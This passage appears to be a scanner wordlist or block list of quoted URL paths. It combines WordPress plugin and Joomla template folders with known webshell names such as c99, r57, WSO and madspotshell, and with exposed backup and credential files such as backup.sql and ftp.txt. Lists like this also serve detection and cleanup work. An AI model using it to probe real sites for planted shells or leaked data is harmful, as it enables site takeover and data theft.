'/wp-content/plugins/disqus-comment-system/c22.php', '/wp-content/plugins/disqus-comment-system/c100.php', '/wp-content/plugins/disqus-comment-system/configuration.php', '/wp-content/plugins/disqus-comment-system/g.php', '/wp-content/plugins/disqus-comment-system/xx.pl', '/wp-content/plugins/disqus-comment-system/ls.php', '/wp-content/plugins/disqus-comment-system/Cpanel.php', '/wp-content/plugins/disqus-comment-system/k.php', '/wp-content/plugins/disqus-comment-system/zone-h.php', '/wp-content/plugins/disqus-comment-system/tmp/user.php', '/wp-content/plugins/disqus-comment-system/tmp/Sym.php', '/wp-content/plugins/disqus-comment-system/cp.php', '/wp-content/plugins/disqus-comment-system/tmp/madspotshell.php', '/wp-content/plugins/disqus-comment-system/tmp/root.php', '/wp-content/plugins/disqus-comment-system/tmp/whmcs.php', '/wp-content/plugins/disqus-comment-system/tmp/index.php', '/wp-content/plugins/disqus-comment-system/tmp/2.php', '/wp-content/plugins/disqus-comment-system/tmp/dz.php', '/wp-content/plugins/disqus-comment-system/tmp/cpn.php', '/wp-content/plugins/disqus-comment-system/tmp/changeall.php', '/wp-content/plugins/disqus-comment-system/tmp/Cgishell.pl', '/wp-content/plugins/disqus-comment-system/tmp/sql.php', '/wp-content/plugins/disqus-comment-system/0day.php', '/wp-content/plugins/disqus-comment-system/tmp/admin.php', '/wp-content/plugins/disqus-comment-system/L3b.php', '/wp-content/plugins/disqus-comment-system/d.php', '/wp-content/plugins/disqus-comment-system/tmp/d.php', '/wp-content/plugins/disqus-comment-system/tmp/L3b.php', '/wp-content/plugins/disqus-comment-system/sado.php', '/wp-content/plugins/disqus-comment-system/admin1.php', '/wp-content/plugins/disqus-comment-system/upload.php', '/wp-content/plugins/disqus-comment-system/up.php', '/wp-content/plugins/disqus-comment-system/vb.zip', '/wp-content/plugins/disqus-comment-system/vb.rar', '/wp-content/plugins/disqus-comment-system/admin2.asp', '/wp-content/plugins/disqus-comment-system/uploads.php', '/wp-content/plugins/disqus-comment-system/sa.php', '/wp-content/plugins/disqus-comment-system/sysadmins/', '/wp-content/plugins/disqus-comment-system/admin1/', '/wp-content/plugins/disqus-comment-system/sniper.php', '/wp-content/plugins/disqus-comment-system/images/Sym.php', '/wp-content/plugins/disqus-comment-system//r57.php', '/wp-content/plugins/disqus-comment-system/gzaa_spysl', '/wp-content/plugins/disqus-comment-system/sql-new.php', '/wp-content/plugins/disqus-comment-system//shell.php', '/wp-content/plugins/disqus-comment-system//sa.php', '/wp-content/plugins/disqus-comment-system//admin.php', '/wp-content/plugins/disqus-comment-system//sa2.php', '/wp-content/plugins/disqus-comment-system//2.php', '/wp-content/plugins/disqus-comment-system//gaza.php', '/wp-content/plugins/disqus-comment-system//up.php', '/wp-content/plugins/disqus-comment-system//upload.php', '/wp-content/plugins/disqus-comment-system//uploads.php', '/wp-content/plugins/disqus-comment-system/shell.php', '/wp-content/plugins/disqus-comment-system//amad.php', '/wp-content/plugins/disqus-comment-system//t00.php', 'pwp-content/plugins/disqus-comment-system/disqus.php', 'wp-content/plugins/akismet/WSO.php', 'wp-content/plugins/akismet/dz.php', 'wp-content/plugins/akismet/DZ.php', 'wp-content/plugins/akismet/cpanel.php', 'wp-content/plugins/akismet/cpn.php', 'wp-content/plugins/akismet/sos.php', 'wp-content/plugins/akismet/term.php', 'wp-content/plugins/akismet/Sec-War.php', 'wp-content/plugins/akismet/sql.php', 'wp-content/plugins/akismet/ssl.php', 'wp-content/plugins/akismet/mysql.php', 'wp-content/plugins/akismet/WolF.php', 'wp-content/plugins/akismet/madspot.php', 'wp-content/plugins/akismet/Cgishell.pl', 'wp-content/plugins/akismet/killer.php', 'wp-content/plugins/akismet/changeall.php', 'wp-content/plugins/akismet/2.php', 'wp-content/plugins/akismet/Sh3ll.php', 'wp-content/plugins/akismet/dz0.php', 'wp-content/plugins/akismet/dam.php', 'wp-content/plugins/akismet/user.php', 'wp-content/plugins/akismet/dom.php', 'wp-content/plugins/akismet/whmcs.php', 'wp-content/plugins/akismet/vb.zip', 'wp-content/plugins/akismet/r00t.php', 'wp-content/plugins/akismet/c99.php', 'wp-content/plugins/akismet/gaza.php', 'wp-content/plugins/akismet/1.php', 'wp-content/plugins/akismet/d0mains.php', 'wp-content/plugins/akismet/madspotshell.php', 'wp-content/plugins/akismet/info.php', 'wp-content/plugins/akismet/egyshell.php', 'wp-content/plugins/akismet/Sym.php', 'wp-content/plugins/akismet/c22.php', 'wp-content/plugins/akismet/c100.php', 'wp-content/plugins/akismet/configuration.php', 'wp-content/plugins/akismet/g.php', 'wp-content/plugins/akismet/xx.pl', 'wp-content/plugins/akismet/ls.php', 'wp-content/plugins/akismet/Cpanel.php', 'wp-content/plugins/akismet/k.php', 'wp-content/plugins/akismet/zone-h.php', 'wp-content/plugins/akismet/tmp/user.php', 'wp-content/plugins/akismet/tmp/Sym.php', 'wp-content/plugins/akismet/cp.php', 'wp-content/plugins/akismet/tmp/madspotshell.php', 'wp-content/plugins/akismet/tmp/root.php', 'wp-content/plugins/akismet/tmp/whmcs.php', 'wp-content/plugins/akismet/tmp/index.php', 'wp-content/plugins/akismet/tmp/2.php', 'wp-content/plugins/akismet/tmp/dz.php', 'wp-content/plugins/akismet/tmp/cpn.php', 'wp-content/plugins/akismet/tmp/changeall.php', 'wp-content/plugins/akismet/tmp/Cgishell.pl', 'wp-content/plugins/akismet/tmp/sql.php', 'wp-content/plugins/akismet/0day.php', 'wp-content/plugins/akismet/tmp/admin.php', 'wp-content/plugins/akismet/L3b.php', 'wp-content/plugins/akismet/d.php', 'wp-content/plugins/akismet/tmp/d.php', 'wp-content/plugins/akismet/tmp/L3b.php', 'wp-content/plugins/akismet/sado.php', 'wp-content/plugins/akismet/admin1.php', 'wp-content/plugins/akismet/upload.php', 'wp-content/plugins/akismet/up.php', 'wp-content/plugins/akismet/vb.zip', 'wp-content/plugins/akismet/vb.rar', 'wp-content/plugins/akismet/admin2.asp', 'wp-content/plugins/akismet/uploads.php', 'wp-content/plugins/akismet/sa.php', 'wp-content/plugins/akismet/sysadmins/', 'wp-content/plugins/akismet/admin1/', 'wp-content/plugins/akismet/sniper.php', 'wp-content/plugins/akismet/images/Sym.php', 'wp-content/plugins/akismet//r57.php', 'wp-content/plugins/akismet/gzaa_spysl', 'wp-content/plugins/akismet/sql-new.php', 'wp-content/plugins/akismet//shell.php', 'wp-content/plugins/akismet//sa.php', 'wp-content/plugins/akismet//admin.php', 'wp-content/plugins/akismet//sa2.php', 'wp-content/plugins/akismet//2.php', 'wp-content/plugins/akismet//gaza.php', 'wp-content/plugins/akismet//up.php', 'wp-content/plugins/akismet//upload.php', 'wp-content/plugins/akismet//uploads.php', 'wp-content/plugins/akismet/shell.php', 'wp-content/plugins/akismet//amad.php', 'wp-content/plugins/akismet//t00.php', 'wp-content/plugins/akismet//dz.php', 'wp-content/plugins/akismet//site.rar', 'wp-content/plugins/akismet//Black.php', 'wp-content/plugins/akismet//site.tar.gz', 'wp-content/plugins/akismet//home.zip', 'wp-content/plugins/akismet//home.rar', 'wp-content/plugins/akismet//home.tar', 'wp-content/plugins/akismet//home.tar.gz', 'wp-content/plugins/akismet//forum.zip', 'wp-content/plugins/akismet//forum.rar', 'wp-content/plugins/akismet//forum.tar', 'wp-content/plugins/akismet//forum.tar.gz', 'wp-content/plugins/akismet//test.txt', 'wp-content/plugins/akismet//ftp.txt', 'wp-content/plugins/akismet//user.txt', 'wp-content/plugins/akismet//site.txt', 'wp-content/plugins/akismet//error_log', 'wp-content/plugins/akismet//error', 'wp-content/plugins/akismet//cpanel', 'wp-content/plugins/akismet//awstats', 'wp-content/plugins/akismet//site.sql', 'wp-content/plugins/akismet//vb.sql', 'wp-content/plugins/akismet//forum.sql', 'wp-content/plugins/akismet/r00t-s3c.php', 'wp-content/plugins/akismet/c.php', 'wp-content/plugins/akismet//backup.sql', 'wp-content/plugins/akismet//back.sql', 'wp-content/plugins/akismet//data.sql', 'wp-content/plugins/akismet/wp.rar/', 'wp-content/plugins/akismet/asp.aspx', 'wp-content/plugins/akismet/tmp/vaga.php', 'wp-content/plugins/akismet/tmp/killer.php', 'wp-content/plugins/akismet/whmcs.php', 'wp-content/plugins/akismet/abuhlail.php', 'wp-content/plugins/akismet/tmp/killer.php', 'wp-content/plugins/akismet/tmp/domaine.pl', 'wp-content/plugins/akismet/tmp/domaine.php', 'wp-content/plugins/akismet/useradmin/', 'wp-content/plugins/akismet/tmp/d0maine.php', 'wp-content/plugins/akismet/d0maine.php', 'wp-content/plugins/akismet/tmp/sql.php', 'wp-content/plugins/akismet/X.php', 'wp-content/plugins/akismet/123.php', 'wp-content/plugins/akismet/m.php', 'wp-content/plugins/akismet/b.php', 'wp-content/plugins/akismet/up.php', 'wp-content/plugins/akismet/tmp/dz1.php', 'wp-content/plugins/akismet/dz1.php', 'wp-content/plugins/akismet/forum.zip', 'wp-content/plugins/akismet/Symlink.php', 'wp-content/plugins/akismet/Symlink.pl', 'wp-content/plugins/akismet/forum.rar', 'wp-content/plugins/akismet/joomla.zip', 'wp-content/plugins/akismet/joomla.rar', 'wp-content/plugins/akismet/wp.php', 'wp-content/plugins/akismet/buck.sql', 'wp-content/plugins/akismet/sysadmin.php', 'wp-content/plugins/akismet/images/c99.php', 'wp-content/plugins/akismet/xd.php', 'wp-content/plugins/akismet/c100.php', 'wp-content/plugins/akismet/spy.aspx', 'wp-content/plugins/akismet/xd.php', 'wp-content/plugins/akismet/tmp/xd.php', 'wp-content/plugins/akismet/sym/root/home/', 'wp-content/plugins/akismet/billing/killer.php', 'wp-content/plugins/akismet/tmp/upload.php', 'wp-content/plugins/akismet/tmp/admin.php', 'wp-content/plugins/akismet/Server.php', 'wp-content/plugins/akismet/tmp/uploads.php', 'wp-content/plugins/akismet/tmp/up.php', 'wp-content/plugins/akismet/Server/', 'wp-content/plugins/akismet/wp-admin/c99.php', 'wp-content/plugins/akismet/tmp/priv8.php', 'wp-content/plugins/akismet/priv8.php', 'wp-content/plugins/akismet/cgi.pl/', 'wp-content/plugins/akismet/tmp/cgi.pl', 'wp-content/plugins/akismet/downloads/dom.php', 'wp-content/plugins/akismet/webadmin.html', 'wp-content/plugins/akismet/admins.php', 'wp-content/plugins/akismet/bluff.php', 'wp-content/plugins/akismet/king.jeen', 'wp-content/plugins/akismet/admins/', 'wp-content/plugins/akismet/admins.asp', 'wp-content/plugins/akismet/admins.php', 'wp-content/plugins/akismet/wp.zip', 'wp-content/plugins/akismet/disqus.php', 'wp-content/plugins/google-sitemap-generator//cpanel', 'wp-content/plugins/google-sitemap-generator//awstats', 'wp-content/plugins/google-sitemap-generator//site.sql', 'wp-content/plugins/google-sitemap-generator//vb.sql', 'wp-content/plugins/google-sitemap-generator//forum.sql', 'wp-content/plugins/google-sitemap-generator/r00t-s3c.php', 'wp-content/plugins/google-sitemap-generator/c.php', 'wp-content/plugins/google-sitemap-generator//backup.sql', 'wp-content/plugins/google-sitemap-generator//back.sql', 'wp-content/plugins/google-sitemap-generator//data.sql', 'wp-content/plugins/google-sitemap-generator/wp.rar/', 'wp-content/plugins/google-sitemap-generator/asp.aspx', 'wp-content/plugins/google-sitemap-generator/tmp/vaga.php', 'wp-content/plugins/google-sitemap-generator/tmp/killer.php', 'wp-content/plugins/google-sitemap-generator/whmcs.php', 'wp-content/plugins/google-sitemap-generator/abuhlail.php', 'wp-content/plugins/google-sitemap-generator/tmp/killer.php', 'wp-content/plugins/google-sitemap-generator/tmp/domaine.pl', 'wp-content/plugins/google-sitemap-generator/tmp/domaine.php', 'wp-content/plugins/google-sitemap-generator/useradmin/', 'wp-content/plugins/google-sitemap-generator/tmp/d0maine.php', 'wp-content/plugins/google-sitemap-generator/d0maine.php', 'wp-content/plugins/google-sitemap-generator/tmp/sql.php', 'wp-content/plugins/google-sitemap-generator/X.php', 'wp-content/plugins/google-sitemap-generator/123.php', 'wp-content/plugins/google-sitemap-generator/m.php', 'wp-content/plugins/google-sitemap-generator/b.php', 'wp-content/plugins/google-sitemap-generator/up.php', 'wp-content/plugins/google-sitemap-generator/tmp/dz1.php', 'wp-content/plugins/google-sitemap-generator/dz1.php', 'wp-content/plugins/google-sitemap-generator/forum.zip', 'wp-content/plugins/google-sitemap-generator/Symlink.php', 'wp-content/plugins/google-sitemap-generator/Symlink.pl', 'wp-content/plugins/google-sitemap-generator/forum.rar', 'wp-content/plugins/google-sitemap-generator/joomla.zip', 'wp-content/plugins/google-sitemap-generator/joomla.rar', 'wp-content/plugins/google-sitemap-generator/wp.php', 'wp-content/plugins/google-sitemap-generator/buck.sql', 'wp-content/plugins/google-sitemap-generator/sysadmin.php', 'wp-content/plugins/google-sitemap-generator/images/c99.php', 'wp-content/plugins/google-sitemap-generator/xd.php', 'wp-content/plugins/google-sitemap-generator/c100.php', 'wp-content/plugins/google-sitemap-generator/spy.aspx', 'wp-content/plugins/google-sitemap-generator/xd.php', 'wp-content/plugins/google-sitemap-generator/tmp/xd.php', 'wp-content/plugins/google-sitemap-generator/sym/root/home/', 'wp-content/plugins/google-sitemap-generator/billing/killer.php', 'wp-content/plugins/google-sitemap-generator/tmp/upload.php', 'wp-content/plugins/google-sitemap-generator/tmp/admin.php', 'wp-content/plugins/google-sitemap-generator/Server.php', 'wp-content/plugins/google-sitemap-generator/tmp/uploads.php', 'wp-content/plugins/google-sitemap-generator/tmp/up.php', 'wp-content/plugins/google-sitemap-generator/Server/', 'wp-content/plugins/google-sitemap-generator/wp-admin/c99.php', 'wp-content/plugins/google-sitemap-generator/tmp/priv8.php', 'wp-content/plugins/google-sitemap-generator/priv8.php', 'wp-content/plugins/google-sitemap-generator/cgi.pl/', 'wp-content/plugins/google-sitemap-generator/tmp/cgi.pl', 'wp-content/plugins/google-sitemap-generator/downloads/dom.php', 'wp-content/plugins/google-sitemap-generator/webadmin.html', 'wp-content/plugins/google-sitemap-generator/admins.php', 'wp-content/plugins/google-sitemap-generator/bluff.php', 'wp-content/plugins/google-sitemap-generator/king.jeen', 'wp-content/plugins/google-sitemap-generator/admins/', 'wp-content/plugins/google-sitemap-generator/admins.asp', 'wp-content/plugins/google-sitemap-generator/admins.php', 'wp-content/plugins/google-sitemap-generator/wp.zip', 'wp-content/plugins/google-sitemap-generator/sitemap-core.php', '/templates/beez/WSO.php', '/templates/beez/dz.php', '/templates/beez/DZ.php', '/templates/beez/cpanel.php', '/templates/beez/cpn.php', '/templates/beez/sos.php', '/templates/beez/term.php', '/templates/beez/Sec-War.php', '/templates/beez/sql.php', '/templates/beez/ssl.php', '/templates/beez/mysql.php', '/templates/beez/WolF.php', '/templates/beez/madspot.php', '/templates/beez/Cgishell.pl', '/templates/beez/killer.php', '/templates/beez/changeall.php', '/templates/beez/2.php', '/templates/beez/Sh3ll.php', '/templates/beez/dz0.php', '/templates/beez/dam.php', '/templates/beez/user.php', '/templates/beez/dom.php', '/templates/beez/whmcs.php', '/templates/beez/vb.zip', '/templates/beez/r00t.php', '/templates/beez/c99.php', '/templates/beez/gaza.php', '/templates/beez/1.php', '/templates/beez/d0mains.php', '/templates/beez/madspotshell.php', '/templates/beez/info.php', '/templates/beez/egyshell.php', '/templates/beez/Sym.php', '/templates/beez/c22.php', '/templates/beez/c100.php', '/templates/beez/configuration.php', '/templates/beez/g.php', '/templates/beez/xx.pl', '/templates/beez/ls.php', '/templates/beez/Cpanel.php', '/templates/beez/k.php', '/templates/beez/zone-h.php', '/templates/beez/tmp/user.php', '/templates/beez/tmp/Sym.php', '/templates/beez/cp.php', '/templates/beez/tmp/madspotshell.php', '/templates/beez/tmp/root.php', '/templates/beez/tmp/whmcs.php', '/templates/beez/tmp/index.php', '/templates/beez/tmp/2.php', '/templates/beez/tmp/dz.php', '/templates/beez/tmp/cpn.php', '/templates/beez/tmp/changeall.php', '/templates/beez/tmp/Cgishell.pl', '/templates/beez/tmp/sql.php', '/templates/beez/0day.php', '/templates/beez/tmp/admin.php', '/templates/beez/L3b.php', '/templates/beez/d.php', '/templates/beez/tmp/d.php', '/templates/beez/tmp/L3b.php', '/templates/beez/sado.php', '/templates/beez/admin1.php', '/templates/beez/upload.php', '/templates/beez/up.php', '/templates/beez/vb.zip', '/templates/beez/vb.rar', '/templates/beez/admin2.asp', '/templates/beez/uploads.php', '/templates/beez/sa.php', '/templates/beez/sysadmins/', '/templates/beez/admin1/', '/templates/beez/sniper.php', '/templates/beez/images/Sym.php', '/templates/beez//r57.php', '/templates/beez/gzaa_spysl', '/templates/beez/sql-new.php', '/templates/beez//shell.php', '/templates/beez//sa.php', '/templates/beez//admin.php', '/templates/beez//sa2.php', '/templates/beez//2.php', '/templates/beez//gaza.php', '/templates/beez//up.php', '/templates/beez//upload.php', '/templates/beez//uploads.php', '/templates/beez/shell.php', '/templates/beez//amad.php', '/templates/beez//t00.php', '/templates/beez//dz.php', '/templates/beez//site.rar', '/templates/beez//Black.php', '/templates/beez//site.tar.gz', '/templates/beez//home.zip', '/templates/beez//home.rar', '/templates/beez//home.tar', '/templates/beez//home.tar.gz', '/templates/beez//forum.zip', '/templates/beez//forum.rar', '/templates/beez//forum.tar', '/templates/beez//forum.tar.gz', '/templates/beez//test.txt', '/templates/beez//ftp.txt', '/templates/beez//user.txt', '/templates/beez//site.txt', '/templates/beez//error_log', '/templates/beez//error', '/templates/beez//cpanel', '/templates/beez//awstats', '/templates/beez//site.sql', '/templates/beez//vb.sql', '/templates/beez//forum.sql', '/templates/beez/r00t-s3c.php', '/templates/beez/c.php', '/templates/beez//backup.sql', '/templates/beez//back.sql', '/templates/beez//data.sql', '/templates/beez/wp.rar/', '/templates/beez/asp.aspx', '/templates/beez/tmp/vaga.php', '/templates/beez/tmp/killer.php', '/templates/beez/whmcs.php', '/templates/beez/abuhlail.php', '/templates/beez/tmp/killer.php', '/templates/beez/tmp/domaine.pl', '/templates/beez/tmp/domaine.php', '/templates/beez/useradmin/', '/templates/beez/tmp/d0maine.php', '/templates/beez/d0maine.php', '/templates/beez/tmp/sql.php', '/templates/beez/X.php', '/templates/beez/123.php', '/templates/beez/m.php', '/templates/beez/b.php', '/templates/beez/up.php', '/templates/beez/tmp/dz1.php', '/templates/beez/dz1.php', '/templates/beez/forum.zip', '/templates/beez/Symlink.php', '/templates/beez/Symlink.pl', '/templates/beez/forum.rar', '/templates/beez/joomla.zip', '/templates/beez/joomla.rar', '/templates/beez/wp.php', '/templates/beez/buck.sql', '/templates/beez/sysadmin.php', '/templates/beez/images/c99.php', '/templates/beez/xd.php', '/templates/beez/c100.php', '/templates/beez/spy.aspx', '/templates/beez/xd.php', '/templates/beez/tmp/xd.php', '/templates/beez/sym/root/home/', '/templates/beez/billing/killer.php', '/templates/beez/tmp/upload.php', '/templates/beez/tmp/admin.php', '/templates/beez/Server.php', '/templates/beez/tmp/uploads.php', '/templates/beez/tmp/up.php', '/templates/beez/Server/', '/templates/beez/wp-admin/c99.php', '/templates/beez/tmp/priv8.php', '/templates/beez/priv8.php', '/templates/beez/cgi.pl/', '/templates/beez/tmp/cgi.pl', '/templates/beez/downloads/dom.php', '/templates/beez/webadmin.html', '/templates/beez/admins.php', '/templates/beez/bluff.php', '/templates/beez/king.jeen', '/templates/beez/admins/', '/templates/beez/admins.asp', '/templates/beez/admins.php', '/templates/beez/wp.zip', '/templates/beez/index.php/images/WSO.php', '/images/dz.php', '/images/DZ.php', '/images/cpanel.php', '/images/cpn.php', '/images/sos.php', '/images/term.php', '/images/Sec-War.php', '/images/sql.php', '/images/ssl.php', '/images/mysql.php', '/images/WolF.php', '/images/madspot.php', '/images/Cgishell.pl', '/images/killer.php', '/images/changeall.php', '/images/2.php', '/images/Sh3ll.php', '/images/dz0.php', '/images/dam.php', '/images/user.php', '/images/dom.php', '/images/whmcs.php', '/images/vb.zip', '/images/r00t.php', '/images/c99.php', '/images/gaza.php', '/images/1.php', '/images/d0mains.php', '/images/madspotshell.php', '/images/info.php', '/images/egyshell.php', '/images/Sym.php', '/images/c22.php', '/images/c100.php', '/images/configuration.php', '/images/g.php', '/images/xx.pl', '/images/ls.php', '/images/Cpanel.php', '/images/k.php', '/images/zone-h.php', '/images/tmp/user.php', '/images/tmp/Sym.php', '/images/cp.php', '/images/tmp/madspotshell.php', '/images/tmp/root.php', '/images/tmp/whmcs.php', '/images/tmp/index.php', '/images/tmp/2.php', '/images/tmp/dz.php', '/images/tmp/cpn.php', '/images/tmp/changeall.php', '/images/tmp/Cgishell.pl', '/images/tmp/sql.php', '/images/0day.php', '/images/tmp/admin.php', '/images/L3b.php', '/images/d.php', '/images/tmp/d.php', '/images/tmp/L3b.php', '/images/sado.php', '/images/admin1.php', '/images/upload.php', '/images/up.php', '/images/vb.zip', '/images/vb.rar', '/images/admin2.asp', '/images/uploads.php', '/images/sa.php', '/images/sysadmins/', '/images/admin1/', '/images/sniper.php', '/images/images/Sym.php', '/images//r57.php', '/images/gzaa_spysl', '/images/sql-new.php', '/images//shell.php', '/images//sa.php', '/images//admin.php', '/images//sa2.php', '/images//2.php', '/images//gaza.php', '/images//up.php', '/images//upload.php', '/images//uploads.php', '/images/shell.php', '/images//amad.php', '/images//t00.php', '/images//dz.php', '/images//site.rar', '/images//Black.php', '/images//site.tar.gz', '/images//home.zip', '/images//home.rar', '/images//home.tar', '/images//home.tar.gz', '/images//forum.zip', '/images//forum.rar', '/images//forum.tar', '/images//forum.tar.gz', '/images//test.txt', '/images//ftp.txt', '/images//user.txt', '/images//site.txt', '/images//error_log', '/images//error', '/images//cpanel', '/images//awstats', '/images//site.sql', '/images//vb.sql', '/images//forum.sql', '/images/r00t-s3c.php', '/images/c.php', '/images//backup.sql', '/images//back.sql', '/images//data.sql', '/images/wp.rar/', '/images/asp.aspx', '/images/tmp/vaga.php', '/images/tmp/killer.php', '/images/whmcs.php', '/images/abuhlail.php', '/images/tmp/killer.php', '/images/tmp/domaine.pl', '/images/tmp/domaine.php', '/images/useradmin/', '/images/tmp/d0maine.php', '/images/d0maine.php', '/images/tmp/sql.php', '/images/X.php', '/images/123.php', '/images/m.php', '/images/b.php', '/images/up.php', '/images/tmp/dz1.php', '/images/dz1.php', '/images/forum.zip', '/images/Symlink.php', '/images/Symlink.pl', '/images/forum.rar', '/images/joomla.zip', '/images/joomla.rar', '/images/wp.php', '/images/buck.sql', '/includes/WSO.php', '/includes/dz.php', '/includes/DZ.php', '/includes/cpanel.php', '/includes/cpn.php', '/includes/sos.php', '/includes/term.php', '/includes/Sec-War.php', '/includes/sql.php', '/includes/ssl.php', '/includes/mysql.php', '/includes/WolF.php', '/includes/madspot.php', '/includes/Cgishell.pl', '/includes/killer.php', '/includes/changeall.php', '/includes/2.php', '/includes/Sh3ll.php', '/includes/dz0.php', '/includes/dam.php', '/includes/user.php', '/includes/dom.php', '/includes/whmcs.php', '/includes/vb.zip', '/includes/r00t.php', '/includes/c99.php', '/includes/gaza.php', '/includes/1.php', '/includes/d0mains.php', '/includes/madspotshell.php', '/includes/info.php', '/includes/egyshell.php', '/includes/Sym.php', '/includes/c22.php', '/includes/c100.php', '/includes/configuration.php', '/includes/g.php', '/includes/xx.pl', '/includes/ls.php', '/includes/Cpanel.php', '/includes/k.php', '/includes/zone-h.php', '/includes/tmp/user.php', '/includes/tmp/Sym.php', '/includes/cp.php', '/includes/tmp/madspotshell.php', '/includes/tmp/root.php', '/includes/tmp/whmcs.php', '/includes/tmp/index.php', '/includes/tmp/2.php', '/includes/tmp/dz.php', '/includes/tmp/cpn.php', '/includes/tmp/changeall.php', '/includes/tmp/Cgishell.pl', '/includes/tmp/sql.php', '/includes/0day.php', '/includes/tmp/admin.php', '/includes/L3b.php', '/includes/d.php', '/includes/tmp/d.php', '/includes/tmp/L3b.php', '/includes/sado.php', '/includes/admin1.php', '/includes/upload.php', '/includes/up.php', '/includes/vb.zip', '/includes/vb.rar', '/includes/admin2.asp', '/includes/uploads.php', '/includes/sa.php', '/includes/sysadmins/', '/includes/admin1/', '/includes/sniper.php', '/includes/images/Sym.php', '/includes//r57.php', '/includes/gzaa_spysl', '/includes/sql-new.php', '/includes//shell.php', '/includes//sa.php', '/includes//admin.php', '/includes//sa2.php', '/includes//2.php', '/includes//gaza.php', '/includes//up.php', '/includes//upload.php', '/includes//uploads.php', '/includes/shell.php', '/includes//amad.php', '/includes//t00.php', '/includes//dz.php', '/includes//site.rar', '/includes//Black.php', '/includes//site.tar.gz', '/includes//home.zip', '/includes//home.rar', '/includes//home.tar', '/includes//home.tar.gz', '/includes//forum.zip', '/includes//forum.rar', '/includes//forum.tar', '/includes//forum.tar.gz', '/includes//test.txt', '/includes//ftp.txt', '/includes//user.txt', '/includes//site.txt', '/includes//error_log', '/includes//error', '/includes//cpanel', '/includes//awstats', '/includes//site.sql', '/includes//vb.sql', '/includes//forum.sql', '/includes/r00t-s3c.php', '/includes/c.php', '/includes//backup.sql', '/includes//back.sql', '/includes//data.sql', '/includes/wp.rar/', '/includes/asp.aspx', '/includes/tmp/vaga.php', '/includes/tmp/killer.php', '/includes/whmcs.php', '/includes/abuhlail.php', '/includes/tmp/killer.php', '/includes/tmp/domaine.pl', '/includes/tmp/domaine.php', '/includes/useradmin/', '/includes/tmp/d0maine.php', '/includes/d0maine.php', '/includes/tmp/sql.php', '/includes/X.php', '/includes/123.php', '/includes/m.php', '/includes/b.php', '/includes/up.php', '/includes/tmp/dz1.php', '/includes/dz1.php', '/includes/forum.zip', '/includes/Symlink.php', '/includes/Symlink.pl', '/includes/forum.rar', '/includes/joomla.zip', '/includes/joomla.rar', '/includes/wp.php', '/includes/buck.sql', '/includes/sysadmin.php', '/includes/images/c99.php', '/includes/xd.php', '/includes/c100.php', '/includes/spy.aspx', '/includes/xd.php', '/includes/tmp/xd.php', '/includes/sym/root/home/', '/includes/billing/killer.php', '/includes/tmp/upload.php', '/includes/tmp/admin.php', '/includes/Server.php', '/includes/tmp/uploads.php', '/includes/tmp/up.php', '/includes/Server/', '/includes/wp-admin/c99.php', '/includes/tmp/priv8.php', '/includes/priv8.php', '/includes/cgi.pl/', '/includes/tmp/cgi.pl', '/includes/downloads/dom.php', '/includes/webadmin.html', '/includes/admins.php', '/includes/bluff.php', '/includes/king.jeen', '/includes/admins/', '/includes/admins.asp', '/includes/admins.php', '/includes/wp.zip', '/includes/', '/templates/rhuk_milkyway/WSO.php', '/templates/rhuk_milkyway/dz.php', '/templates/rhuk_milkyway/DZ.php', '/templates/rhuk_milkyway/cpanel.php', '/templates/rhuk_milkyway/cpn.php', '/templates/rhuk_milkyway/sos.php', '/templates/rhuk_milkyway/term.php', '/templates/rhuk_milkyway/Sec-War.php', '/templates/rhuk_milkyway/sql.php', '/templates/rhuk_milkyway/ssl.php', '/templates/rhuk_milkyway/mysql.php', '/templates/rhuk_milkyway/WolF.php', '/templates/rhuk_milkyway/madspot.php', '/templates/rhuk_milkyway/Cgishell.pl', '/templates/rhuk_milkyway/killer.php', '/templates/rhuk_milkyway/changeall.php', '/templates/rhuk_milkyway/2.php', '/templates/rhuk_milkyway/Sh3ll.php', '/templates/rhuk_milkyway/dz0.php', '/templates/rhuk_milkyway/dam.php', '/templates/rhuk_milkyway/user.php', '/templates/rhuk_milkyway/dom.php', '/templates/rhuk_milkyway/whmcs.php', '/templates/rhuk_milkyway/vb.zip', '/templates/rhuk_milkyway/r00t.php', '/templates/rhuk_milkyway/c99.php', '/templates/rhuk_milkyway/gaza.php', '/templates/rhuk_milkyway/1.php', '/templates/rhuk_milkyway/d0mains.php', '/templates/rhuk_milkyway/madspotshell.php', '/templates/rhuk_milkyway/info.php', '/templates/rhuk_milkyway/egyshell.php', '/templates/rhuk_milkyway/Sym.php', '/templates/rhuk_milkyway/c22.php', '/templates/rhuk_milkyway/c100.php', '/templates/rhuk_milkyway/configuration.php', '/templates/rhuk_milkyway/g.php', '/templates/rhuk_milkyway/xx.pl', '/templates/rhuk_milkyway/ls.php', '/templates/rhuk_milkyway/Cpanel.php', '/templates/rhuk_milkyway/k.php', '/templates/rhuk_milkyway/zone-h.php', '/templates/rhuk_milkyway/tmp/user.php', '/templates/rhuk_milkyway/tmp/Sym.php', '/templates/rhuk_milkyway/cp.php', '/templates/rhuk_milkyway/tmp/madspotshell.php', '/templates/rhuk_milkyway/tmp/root.php', '/templates/rhuk_milkyway/tmp/whmcs.php', '/templates/rhuk_milkyway/tmp/index.php', '/templates/rhuk_milkyway/tmp/2.php', '/templates/rhuk_milkyway/tmp/dz.php', '/templates/rhuk_milkyway/tmp/cpn.php', '/templates/rhuk_milkyway/tmp/changeall.php', '/templates/rhuk_milkyway/tmp/Cgishell.pl', '/templates/rhuk_milkyway/tmp/sql.php', '/templates/rhuk_milkyway/0day.php', '/templates/rhuk_milkyway/tmp/admin.php', '/templates/rhuk_milkyway/L3b.php', '/templates/rhuk_milkyway/d.php', '/templates/rhuk_milkyway/tmp/d.php', '/templates/rhuk_milkyway/tmp/L3b.php', '/templates/rhuk_milkyway/sado.php', '/templates/rhuk_milkyway/admin1.php', '/templates/rhuk_milkyway/upload.php', '/templates/rhuk_milkyway/up.php', '/templates/rhuk_milkyway/vb.zip', '/templates/rhuk_milkyway/vb.rar', '/templates/rhuk_milkyway/admin2.asp', '/templates/rhuk_milkyway/uploads.php', '/templates/rhuk_milkyway/sa.php', '/templates/rhuk_milkyway/sysadmins/', '/templates/rhuk_milkyway/admin1/', '/templates/rhuk_milkyway/sniper.php', '/templates/rhuk_milkyway/images/Sym.php', '/templates/rhuk_milkyway//r57.php', '/templates/rhuk_milkyway/gzaa_spysl', '/templates/rhuk_milkyway/sql-new.php', '/templates/rhuk_milkyway//shell.php', '/templates/rhuk_milkyway//sa.php', '/templates/rhuk_milkyway//admin.php', '/templates/rhuk_milkyway//sa2.php', '/templates/rhuk_milkyway//2.php', '/templates/rhuk_milkyway//gaza.php', 